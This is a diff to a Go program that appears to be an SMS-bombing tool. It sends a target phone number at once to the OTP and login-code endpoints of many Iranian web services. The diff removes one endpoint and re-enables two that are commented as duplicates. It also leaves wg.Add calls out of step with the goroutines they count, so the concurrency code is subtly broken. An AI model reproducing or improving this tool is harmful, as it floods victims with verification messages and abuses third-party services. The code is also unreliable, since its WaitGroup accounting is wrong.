@@ -230,9 +230,6 @@ func main() {
 		}, &wg, ch)
 		// api.torob.com (JSON) - Note: User reported issues
 		wg.Add(1)
-		go sendJSONRequest(ctx, "https://api.torob.com/v4/user/phone/send-pin/", map[string]interface{}{
-			"phone_number": phone,
-		}, &wg, ch)
 		// app.ezpay.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://app.ezpay.ir:8443/open/v1/user/validation-code", map[string]interface{}{
@@ -342,9 +339,9 @@ func main() {
 			"phoneNumber": phone,
 		}, &wg, ch)
 		// api.digikalajet.ir (JSON) - Duplicate, already added in previous list
-		// go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
-		// 	"phone": phone,
-		// }, &wg, ch)
+		go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
+		         "phone": phone,
+		}, &wg, ch)
 		// drdr.ir (JSON) - login/mobile/init
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
@@ -386,9 +383,9 @@ func main() {
 			"mobile": phone,
 		}, &wg, ch)
 		// ws.alibaba.ir (JSON) - Duplicate, already added
-		// go sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
-		// 	"phoneNumber": phone,
-		// }, &wg, ch)
+		go sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
+		 	"phoneNumber": phone,
+		 }, &wg, ch)
 		// student.classino.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://student.classino.com/otp/v1/api/login", map[string]interface{}{
